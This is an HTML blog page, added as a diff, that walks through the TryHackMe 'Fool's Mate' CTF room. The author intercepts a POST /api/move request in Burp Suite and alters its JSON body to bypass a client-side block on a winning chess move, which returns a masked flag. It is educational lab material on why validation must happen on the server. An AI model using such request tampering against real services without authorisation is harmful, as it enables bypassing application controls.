@@ -1,0 +1,377 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Fool's Mate Writeup | Bisc's Security Lab</title>
+    <link href="https://fonts.googleapis.com/css2?family=Fira+Code:wght@400;600&family=Inter:wght@400;600;700&display=swap" rel="stylesheet">
+    <style>
+        :root {
+            --bg-color: #080c10;
+            --card-bg: #0d121d;
+            --accent-green: #00ff88;
+            --accent-cyan: #00e5ff;
+            --text-main: #c9d1d9;
+            --text-muted: #8b949e;
+            --border-color: #1f293d;
+            --code-bg: #05080c;
+        }
+
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+        }
+
+        body {
+            background-color: var(--bg-color);
+            color: var(--text-main);
+            font-family: 'Inter', sans-serif;
+            line-height: 1.6;
+            display: flex;
+            min-height: 100vh;
+        }
+
+        ::-webkit-scrollbar {
+            width: 6px;
+            height: 6px;
+        }
+        ::-webkit-scrollbar-track {
+            background: var(--bg-color);
+            border-left: 1px solid var(--border-color);
+        }
+        ::-webkit-scrollbar-thumb {
+            background: var(--accent-green);
+            border-radius: 3px;
+            box-shadow: 0 0 8px rgba(0, 255, 136, 0.4);
+        }
+        ::-webkit-scrollbar-thumb:hover {
+            background: var(--accent-cyan);
+            box-shadow: 0 0 10px rgba(0, 229, 255, 0.6);
+        }
+        * {
+            scrollbar-width: thin;
+            scrollbar-color: var(--accent-green) var(--bg-color);
+        }
+
+        .sidebar {
+            width: 300px;
+            background-color: var(--card-bg);
+            border-right: 1px solid var(--border-color);
+            padding: 2rem 1.5rem;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            position: fixed;
+            height: 100vh;
+        }
+
+        .avatar-container {
+            position: relative;
+            width: 120px;
+            height: 120px;
+            margin-bottom: 1rem;
+        }
+
+        .avatar {
+            width: 100%;
+            height: 100%;
+            border-radius: 15px;
+            object-fit: cover;
+            border: 2px solid var(--accent-green);
+            box-shadow: 0 0 15px rgba(0, 255, 136, 0.3);
+        }
+
+        .profile-name {
+            font-family: 'Fira Code', monospace;
+            font-size: 1.4rem;
+            color: #fff;
+            margin-bottom: 0.2rem;
+        }
+
+        .profile-rank {
+            font-family: 'Fira Code', monospace;
+            font-size: 0.85rem;
+            color: var(--accent-cyan);
+            margin-bottom: 0.8rem;
+        }
+
+        .profile-bio {
+            font-size: 0.85rem;
+            color: var(--text-muted);
+            text-align: center;
+            margin-bottom: 1.5rem;
+            background: rgba(255, 255, 255, 0.03);
+            padding: 0.5rem 1rem;
+            border-radius: 6px;
+            border: 1px solid var(--border-color);
+        }
+
+        .nav-links {
+            width: 100%;
+            display: flex;
+            flex-direction: column;
+            gap: 0.5rem;
+            margin-bottom: auto;
+        }
+
+        .nav-btn {
+            display: block;
+            text-align: left;
+            padding: 0.6rem 1rem;
+            border-radius: 6px;
+            background: transparent;
+            border: 1px solid var(--border-color);
+            color: var(--text-main);
+            text-decoration: none;
+            font-family: 'Fira Code', monospace;
+            font-size: 0.85rem;
+            transition: 0.2s ease;
+        }
+
+        .nav-btn:hover, .nav-btn.active {
+            border-color: var(--accent-green);
+            color: var(--accent-green);
+            background: rgba(0, 255, 136, 0.05);
+        }
+
+        .social-links {
+            width: 100%;
+            margin-top: 1rem;
+        }
+
+        .btn-external {
+            display: block;
+            text-align: center;
+            padding: 0.6rem;
+            border-radius: 6px;
+            background: transparent;
+            border: 1px solid var(--accent-cyan);
+            color: var(--accent-cyan);
+            text-decoration: none;
+            font-family: 'Fira Code', monospace;
+            font-size: 0.8rem;
+            transition: 0.2s ease;
+        }
+
+        .btn-external:hover {
+            background: var(--accent-cyan);
+            color: #000;
+            box-shadow: 0 0 10px rgba(0, 229, 255, 0.4);
+        }
+
+        .main-content {
+            margin-left: 300px;
+            flex: 1;
+            padding: 3rem;
+            max-width: 900px;
+        }
+
+        .breadcrumbs {
+            font-family: 'Fira Code', monospace;
+            font-size: 0.85rem;
+            color: var(--text-muted);
+            margin-bottom: 1.5rem;
+        }
+
+        .breadcrumbs a {
+            color: var(--accent-cyan);
+            text-decoration: none;
+        }
+
+        .breadcrumbs a:hover {
+            text-decoration: underline;
+        }
+
+        .article {
+            background: var(--card-bg);
+            border: 1px solid var(--border-color);
+            border-radius: 8px;
+            padding: 2rem;
+        }
+
+        .article-meta {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 0.8rem;
+            margin-bottom: 1rem;
+            font-family: 'Fira Code', monospace;
+            font-size: 0.8rem;
+        }
+
+        .tag {
+            background: rgba(0, 229, 255, 0.1);
+            color: var(--accent-cyan);
+            padding: 2px 8px;
+            border-radius: 4px;
+            border: 1px solid rgba(0, 229, 255, 0.2);
+        }
+
+        .article h1 {
+            color: #fff;
+            font-size: 1.8rem;
+            margin-bottom: 1rem;
+        }
+
+        .article h2 {
+            color: var(--accent-green);
+            font-family: 'Fira Code', monospace;
+            font-size: 1.1rem;
+            margin: 1.8rem 0 0.8rem 0;
+            border-bottom: 1px solid var(--border-color);
+            padding-bottom: 0.3rem;
+        }
+
+        .article p, .article ul {
+            margin-bottom: 1rem;
+            color: var(--text-main);
+            font-size: 0.95rem;
+        }
+
+        .article ul {
+            padding-left: 1.2rem;
+        }
+
+        .article li {
+            margin-bottom: 0.4rem;
+        }
+
+        pre {
+            background: var(--code-bg);
+            border: 1px solid var(--border-color);
+            border-left: 3px solid var(--accent-green);
+            border-radius: 6px;
+            padding: 1rem;
+            overflow-x: auto;
+            font-family: 'Fira Code', monospace;
+            font-size: 0.85rem;
+            color: #e6edf3;
+            margin: 1rem 0;
+        }
+
+        code {
+            font-family: 'Fira Code', monospace;
+            color: var(--accent-cyan);
+            background: rgba(255, 255, 255, 0.05);
+            padding: 2px 6px;
+            border-radius: 4px;
+            font-size: 0.85rem;
+        }
+
+        @media (max-width: 1055px) {
+            body { flex-direction: column; }
+            .sidebar { width: 100%; height: auto; position: relative; border-right: none; border-bottom: 1px solid var(--border-color); }
+            .main-content { margin-left: 0; padding: 1.5rem; width: 100%; max-width: 100%; }
+        }
+    </style>
+</head>
+<body>
+
+    <aside class="sidebar">
+        <div class="avatar-container">
+            <img src="/avatar2.jpeg" alt="Bisc Profile Picture" class="avatar">
+        </div>
+        <h2 class="profile-name">Bisc</h2>
+        <p class="profile-rank">[0x8][HACKER]</p>
+        <p class="profile-bio">I love biscuits 🙃🍪</p>
+
+        <nav class="nav-links">
+            <a href="/index.html" class="nav-btn">~/home</a>
+            <a href="/ctf/index.html" class="nav-btn active">~/ctf</a>
+            <a href="/about/index.html" class="nav-btn">~/about</a>
+        </nav>
+
+        <div class="social-links">
+            <a href="https://tryhackme.com/p/Bisc" target="_blank" class="btn-external">TryHackMe Profile</a>
+        </div>
+    </aside>
+
+    <main class="main-content">
+        <div class="breadcrumbs">
+            <a href="/index.html">home</a> / <a href="/ctf/index.html">ctf</a> / <a href="/ctf/tryhackme/index.html">tryhackme</a> / <span style="color: var(--text-main);">Fools-Mate</span>
+        </div>
+
+        <article class="article">
+            <div class="article-meta">
+                <span class="tag">TryHackMe</span>
+                <span class="tag">Web Security</span>
+                <span class="tag">Client-Side Bypass</span>
+                <span class="tag">Burp Suite</span>
+                <span class="tag">Easy</span>
+            </div>
+
+            <h1>Fool's Mate — Room Walkthrough</h1>
+            <p>Fool's Mate is an easy web exploitation TryHackMe challenge centered around a chess endgame puzzle called <strong>EndgameTrainer</strong>. Although the board is set up for an immediate one-move checkmate, client-side JavaScript blocks the winning move. Compromising the challenge demonstrates why security controls must never rely solely on client-side validation and how intercepting API traffic with Burp Suite bypasses front-end restrictions.</p>
+
+            <h2>01. Reconnaissance &amp; Client-Side Behavior</h2>
+            <p>Navigating to the target web application at <code>http://10.114.150.133/</code> presented an interactive chess board titled <em>"EndgameTrainer"</em> with the status set to <strong>Mate-in-one · White to move</strong>.</p>
+
+            <p>Looking at the board state, White has a Rook on <code>a1</code>, pawns on <code>f2</code>, <code>g2</code>, and <code>h2</code>, and a King on <code>g1</code>, while Black's King is trapped on <code>g8</code> behind pawns on <code>f7</code>, <code>g7</code>, and <code>h7</code>. Moving the White Rook straight up the file from <code>a1</code> to <code>a8</code> delivers an instant back-rank checkmate.</p>
+
+            <p>However, attempting to play <code>a1</code> to <code>a8</code> in the browser triggered a popup warning instead of executing the move:</p>
+
+<pre><code>I'll shut down your PC if you play that.</code></pre>
+
+            <p>Attempting to play any of the three pawns instead could not deliver checkmate in a single move as required by the challenge. Inspecting the page elements did not immediately expose a bypass, indicating that the restriction was being enforced in the browser before any move was transmitted to the backend.</p>
+
+            <h2>02. Traffic Interception &amp; API Analysis</h2>
+            <p>To observe how valid moves communicate with the server, I opened <strong>Burp Suite</strong>, enabled <strong>Proxy Intercept</strong>, and tested moving the Rook from <code>a1</code> to <code>a8</code> again. No HTTP request appeared in Burp Suite, confirming that the client-side script blocked the winning move locally before sending anything over the network.</p>
+
+            <p>Next, I moved an unrestricted piece—pushing the pawn from <code>f2</code> to <code>f4</code>. Burp Suite immediately intercepted a JSON <code>POST</code> request to <code>/api/move</code>:</p>
+
+<pre><code>POST /api/move HTTP/1.1
+Host: 10.114.150.133
+Content-Length: 23
+Accept-Language: en-US,en;q=0.9
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36
+Content-Type: application/json
+Accept: */*
+Origin: http://10.114.150.133
+Referer: http://10.114.150.133/
+Accept-Encoding: gzip, deflate, br
+Connection: keep-alive
+
+{
+    "from":"f2",
+    "to":"f4"
+}</code></pre>
+
+            <p>The API accepts a simple JSON object containing <code>from</code> and <code>to</code> board coordinates without any cryptographic signature or integrity check.</p>
+
+            <h2>03. Exploitation &amp; Flag Retrieval</h2>
+            <p>With the <code>POST /api/move</code> request paused in Burp Suite Proxy, I modified the JSON payload directly in the request body from the pawn move to the blocked Rook checkmate move:</p>
+
+<pre><code>{
+    "from":"a1",
+    "to":"a8"
+}</code></pre>
+
+            <p>After forwarding the tampered request to the server, the backend validated the chess move as legal and returned a <code>200 OK</code> JSON response containing the updated board state, checkmate status, and the flag:</p>
+
+<pre><code>HTTP/1.1 200 OK
+X-Powered-By: Express
+Content-Type: application/json; charset=utf-8
+
+{
+  "ok": true,
+  "move": "a1a8",
+  "fen": "R5k1/5ppp/8/8/8/8/5PPP/6K1 b - - 1 1",
+  "status": "checkmate",
+  "turn": "b",
+  "winner": "white",
+  "flag": "THM{cl******************3}"
+}</code></pre>
+
+            <p>Simultaneously, the web interface updated to display <strong>Checkmate — White wins</strong> along with the flag banner:</p>
+
+<pre><code>THM{cl******************3}</code></pre>
+
+<p style="color: var(--accent-green); font-family: 'Fira Code', monospace; margin-top: 1.5rem; font-weight: 600;">
+[+] Flag captured! Time for a biscuit 😋🍪
+</p>
+
+        </article>
+    </main>
+
+</body>
+</html>
